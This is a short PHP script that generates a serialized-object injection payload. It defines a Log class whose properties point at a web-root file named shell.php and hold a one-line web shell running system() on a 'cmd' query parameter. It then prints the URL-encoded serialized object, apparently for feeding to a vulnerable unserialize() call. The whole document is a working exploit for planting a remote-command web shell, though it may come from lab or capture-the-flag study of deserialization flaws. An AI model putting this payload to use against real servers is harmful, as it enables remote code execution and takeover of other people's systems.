<?php 
class Log
{
	public $filename = '/var/www/html/scriptz/shell.php';
    public $data = '<?php echo system($_GET["cmd"]); ?>';

}
print urlencode(serialize(new Log));
?>
